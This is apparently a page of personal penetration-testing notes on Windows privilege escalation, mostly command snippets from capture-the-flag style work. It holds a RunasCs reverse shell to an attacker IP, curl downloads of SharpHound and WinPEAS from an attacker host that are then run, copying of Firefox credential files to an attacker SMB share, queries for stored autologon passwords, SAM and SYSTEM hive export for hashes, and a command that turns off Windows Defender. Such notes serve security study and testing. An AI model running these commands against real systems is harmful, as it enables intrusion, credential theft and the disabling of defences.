---
title: Privilege Escalation
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/privilege-escalation
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

## Windows Privilege Esclation

***

## Checking token privileges

```bash
whoami /all
```

Or

```bash
whoami /priv
```

### Tokens

Each user logged onto the system holds an access token with security information for that logon session. The system creates an access token when the user logs on. Every process executed on behalf of the user has a copy of the access token. The token identifies the user, the user's groups, and the user's privileges. A token also contains a logon SID (Security Identifier) that identifies the current

📢 Found interesting token? →&#x20;

## Systeminfo

Check if the Windows version has any known vulnerability (check also the patches applied). From: <https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#system-info>

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

### Finding exploits

Find Exploits for version:

<https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

## PowerShell history

PowerShell saves a history of specified commands in AppData which may lead to interesting data or information.

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

## Find groups and users

You should check if any of the groups where you belong have interesting permissions

### Commands to do so

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privileged group?

📢 If you \*\*belongs to some privileged group you may be able to escalate privileges\*\*. Learn about privileged groups and how to abuse them to escalate privileges here: \[Privileged Groups]\(<https://www.notion.so/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges>)

### Backup Operators group?

Using BackupOperatorToDA, we can exploit the group remotely.

## Unquoted service path

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path *C:\Program Files\Some Folder\Service.exe* Windows will try to execute:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

* To list all unquoted service paths (minus built-in Windows services)

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

## Installed software

Check **permissions of the binaries** (maybe you can overwrite one and escalate privileges) and of the **folders** ([DLL](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

## **Winlogon Credentials**

List autologon credentials:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

## Credentials to other account

We can use RunasC.exe to execute commands with their credentials and send us a shell <https://github.com/antonioCoco/RunasCs>

```bash
**.\Runascs.exe <user> <password> powershell -r 10.10.14.75:1337**
```

## BloodHound

Got access to at least one domain account? Then you can use BloodHound to list possible PE paths.

### BloodHound.py

It is recommended to use [BloodHound.py](http://BloodHound.py) first before running a script or executable (SharpHound) on the system. <https://github.com/fox-it/BloodHound.py>. We can use this script remotely.

```bash
bloodhound-python -u <user> -p <password> -d <domain> -c All -ns <ip>
```

### SharpHound.exe

We can use SharpHound to gather information locally with Sharphound:

```bash
curl 10.10.14.6/SharpHound.exe -o sh.exe
PS C:\programdata> .\sh.exe
```

## Automatic scan (winpeas)

We can use <https://github.com/carlospolop/PEASS-ng> to automatically scan the system for possible misconfigurations.

```bash
curl 10.10.14.6/WinPEASx64.exe -o wp.exe
PS C:\programdata> .\wp.exe
```

## Firefox credentials trough profiles

From the programfiles on the target, can be detriment that FireFox is installed. It is possible that the user nikk37 has a firefox profile with a db key. With this key we can decrypt any saved credentials. The path for the profile is default in “%userprofile%\AppData\Roaming\Mozilla\Firefox\Profiles\” for Windows.

You need two files:

```powershell
copy **key4.db** \\10.10.14.6\TMP\
copy **logins.json** \\10.10.14.6\TMP\
```

Then decrypt the passwords in logins.json with the key4.db with <https://github.com/lclevy/firepwd>

```powershell
python firepwd.py
```

## SQL server locally

If sqlcmd is available, we can use this to connect to a database running locally.

### Check is sqlcmd is available

```powershell
PS C:\> where.exe sqlcmd
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
PS C:\>
```

### Connecting to db using credentials

**Finding tables**

```powershell
PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
```

**Dumping tables**

```powershell
PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
```

## Listing files recursively (finding creds in files)

We can list files recursively in order to find credentials stored in for example, php files:

```bash
dir -recurse *.php | select-string -pattern "database"
```

## **gMS accounts (gMSAs)**

<https://notes.qazeer.io/active-directory/exploitation-gms_accounts>

## Listing Windows Defender Exclusions:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

## Exporting SAM and SYSTEM for hashes:

```powershell
reg save HKLM\sam sam.bak
reg save HKLM\system system.bak
```

## Disable Windows Defender

```
Set-MpPreference -DisableRealtimeMonitoring $true
```
